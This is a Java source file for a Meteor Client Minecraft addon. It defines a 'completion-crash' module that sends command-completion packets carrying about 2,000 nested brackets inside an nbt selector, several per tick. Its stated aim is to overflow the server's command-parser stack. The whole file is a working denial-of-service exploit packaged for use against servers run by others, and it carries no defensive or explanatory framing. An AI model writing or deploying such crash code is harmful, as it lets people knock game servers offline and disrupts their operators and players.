package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.RequestCommandCompletionsC2SPacket;

import java.util.stream.Collectors;
import java.util.stream.IntStream;

public class CompletionCrash extends Module {
    private final SettingGroup sgGeneral = settings.createGroup("Rate");

    private final Setting<Integer> packets = sgGeneral.add(new IntSetting.Builder()
        .name("packets-per-tick").description("Packets sent each tick.")
        .defaultValue(3).min(1).sliderMax(12).build()
    );

    public CompletionCrash() {
        super(AddonTemplate.CRASH_CATEGORY, "completion-crash",
            "Sends a deeply nested JSON structure as a tab-completion query, targeting command parser stack overflow.");
    }

    @EventHandler
    private void onTick(TickEvent.Post event) {
        if (mc.player == null) return;
        String overflow = generateNestedJson(2032);
        String cmd = "msg @a[nbt={PAYLOAD}]".replace("{PAYLOAD}", overflow);
        for (int i = 0; i < packets.get(); i++) {
            mc.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, cmd));
        }
        toggle();
    }

    private static String generateNestedJson(int levels) {
        String open = IntStream.range(0, levels).mapToObj(i -> "[").collect(Collectors.joining());
        return "{a:" + open + "}";
    }
}
